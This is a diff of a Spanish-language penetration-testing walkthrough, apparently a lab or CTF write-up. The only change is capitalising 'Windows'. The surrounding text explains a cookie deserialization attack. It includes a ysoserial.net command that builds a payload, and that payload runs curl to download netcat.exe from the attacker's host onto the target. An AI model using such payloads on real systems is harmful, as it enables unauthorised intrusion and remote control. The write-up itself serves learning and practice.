@@ -148,7 +148,7 @@ viendo esto puedo pensar el realizar una Deseralización de las cookies del perf
 ![[Pasted image 20240714145130.png]]
 
 ### Windows machine
-desde nuestra maquina windows descargamos la herramienta [ysoserial](https://github.com/pwntester/ysoserial.net/releases/download/v1.36/ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9.zip) y luego ja ejecutaremos en una PowerShell con permisos de administrador para poder crear nuestra data serializada. esta data serializada es simplemente una petición web a un servidor de python que en este caso seremos nosotros compartiendo el archivo netcat.exe
+desde nuestra maquina Windows descargamos la herramienta [ysoserial](https://github.com/pwntester/ysoserial.net/releases/download/v1.36/ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9.zip) y luego ja ejecutaremos en una PowerShell con permisos de administrador para poder crear nuestra data serializada. esta data serializada es simplemente una petición web a un servidor de python que en este caso seremos nosotros compartiendo el archivo netcat.exe
 ```python
 .\ysoserial.exe -f JavaScriptSerializer -o base64 -g ObjectDataProvider -c "cmd /c curl 10.13.14.7/netcat.exe -o C:\ProgramData\netcat.exe"
 ```
